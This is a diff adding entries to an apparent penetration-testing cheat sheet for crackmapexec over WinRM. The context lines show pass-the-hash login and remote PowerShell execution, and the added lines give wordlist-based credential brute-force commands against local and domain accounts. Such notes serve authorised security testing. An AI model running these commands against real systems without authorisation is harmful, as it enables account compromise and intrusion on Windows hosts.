@@ -29,3 +29,21 @@ crackmapexec winrm $rhost -u Administrator -p <password> -X "powershell.exe -c \
 ```bash
 crackmapexec winrm $rhost -u some_user -H "some-hash"
 ```
+
+## bruteforce creds local user
+
+```bash
+crackmapexec winrm $rhost -u wordlist.txt -p wordlist.txt --local-auth --continue-on-success
+```
+
+## bruteforce creds domain "none"
+
+```bash
+crackmapexec winrm $rhost -u wordlist.txt -p wordlist.txt --continue-on-success
+```
+
+## bruteforce creds domain custom
+
+```bash
+crackmapexec winrm $rhost -d "yourdomain" -u wordlist.txt -p wordlist.txt --continue-on-success
+```
